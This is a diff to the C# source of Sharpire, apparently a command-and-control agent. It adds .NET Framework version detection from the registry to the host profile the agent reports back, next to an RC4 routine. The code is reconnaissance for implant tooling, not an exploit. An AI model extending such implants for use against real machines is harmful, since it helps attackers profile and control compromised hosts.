@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Linq;
 using System.Management;
+using Microsoft.Win32;
 using System.Management.Automation.Runspaces;
 using System.Net;
 using System.Diagnostics;
@@ -568,11 +569,60 @@ namespace Sharpire
             Process process = Process.GetCurrentProcess();
             information += process.ProcessName + "|";
             information += process.Id + "|";
-            //TODO fix this from being hard coded  
+            //TODO fix this from being hard coded
             information += "csharp|5";
             information += "|" + Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
+            information += "|" + GetDotNetVersion();
 
             return Encoding.ASCII.GetBytes(information);
+        }
+
+        private static string GetDotNetVersion()
+        {
+            try
+            {
+                string clr4 = "";
+                string clr2 = "";
+
+                using (RegistryKey v4Full = Registry.LocalMachine.OpenSubKey(
+                    @"SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"))
+                {
+                    if (v4Full != null && (int)(v4Full.GetValue("Install", 0)) == 1)
+                    {
+                        int release = (int)(v4Full.GetValue("Release", 0));
+                        if (release >= 528040) clr4 = "net48";
+                        else if (release >= 460798) clr4 = "net47";
+                        else if (release >= 393295) clr4 = "net46";
+                        else clr4 = "net45";
+                    }
+                }
+
+                if (string.IsNullOrEmpty(clr4))
+                {
+                    using (RegistryKey v4 = Registry.LocalMachine.OpenSubKey(
+                        @"SOFTWARE\Microsoft\NET Framework Setup\NDP\v4.0"))
+                    {
+                        if (v4 != null && (int)(v4.GetValue("Install", 0)) == 1)
+                            clr4 = "net40";
+                    }
+                }
+
+                using (RegistryKey v35 = Registry.LocalMachine.OpenSubKey(
+                    @"SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.5"))
+                {
+                    if (v35 != null && (int)(v35.GetValue("Install", 0)) == 1)
+                        clr2 = "net35";
+                }
+
+                if (!string.IsNullOrEmpty(clr4) && !string.IsNullOrEmpty(clr2))
+                    return clr4 + ",net35";
+                if (!string.IsNullOrEmpty(clr4))
+                    return clr4;
+                if (!string.IsNullOrEmpty(clr2))
+                    return clr2;
+            }
+            catch { }
+            return "";
         }
 
         public static byte[] rc4Encrypt(byte[] RC4Key, byte[] data)
